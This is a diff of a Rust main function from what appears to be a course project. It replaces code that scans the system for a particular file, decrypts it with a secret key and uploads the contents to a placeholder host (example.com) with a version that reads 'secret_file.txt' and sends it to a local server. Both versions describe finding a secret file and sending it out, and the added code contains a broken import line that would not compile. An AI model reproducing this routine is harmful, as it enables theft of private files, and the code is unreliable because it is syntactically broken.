@@ -1,17 +1,21 @@
 use P3::*;
+std::io::BufReader;
+use std::fs::File;
+#[tokio::main]
+async fn main() {
+    let file_path = "secret_file.txt";
+    let server_url = "https://127.0.0.1";
+    let github_link = "https://github.com/lyssairene/Project3";
 
-fn main() {
-    let file_paths = scan_system().expect("Failed to scan system");
-    let secret_key = parse_secret().expect("Failed to parse secret key");
+    let file = File::open(file_path).expect("Failed to open file");
+    let reader = BufReader::new(file);
 
-    for file_path in file_paths {
-        if file_path.ends_with("special_file.txt") {
-            let mut file = File::open(&file_path).expect("Failed to open special_file.txt");
-            let mut encrypted_data = Vec::new();
-            file.read_to_end(&mut encrypted_data).expect("Failed to read special_file.txt");
-
-            let decrypted_data = decrypt_file(&encrypted_data, &secret_key);
-            send_contents(decrypted_data, "http://example.com/upload").expect("Failed to send contents");
+    if let Ok(data) = scan_system(reader).await {
+        match run_process(data, server_url, github_link).await {
+            Ok(_) => println!("Process completed successfully."),
+            Err(e) => eprintln!("Error: {}", e),
         }
+    } else {
+        eprintln!("Failed to read file.");
     }
 }
